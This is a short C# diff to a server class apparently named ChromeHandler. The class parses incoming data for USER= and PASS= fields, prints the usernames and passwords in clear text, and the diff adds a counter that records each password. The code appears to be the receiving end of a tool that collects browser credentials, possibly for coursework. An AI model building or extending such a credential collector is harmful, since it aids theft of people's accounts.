@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using PS03.PostOperation;
 
 namespace PS03_Server
 {
@@ -11,6 +12,12 @@ namespace PS03_Server
     {
         Mutex mtx = new Mutex();
         bool first = true;
+        private PasswordCounter pwc;
+
+        public ChromeHandler(PasswordCounter PWC)
+        {
+            pwc = PWC;
+        }
         public void Handle(string data)
         {
             int actMark = 0;
@@ -26,7 +33,7 @@ namespace PS03_Server
             string User = data.Substring(usrMark + ("USER=").Length, pasMark - (usrMark + ("USER=").Length));
 
             string Password = data.Substring(pasMark + ("PASS=").Length, data.Length - (pasMark + ("PASS=").Length));
-
+            pwc.Add(Password);
             Print(Action, User, Password);
 
         }
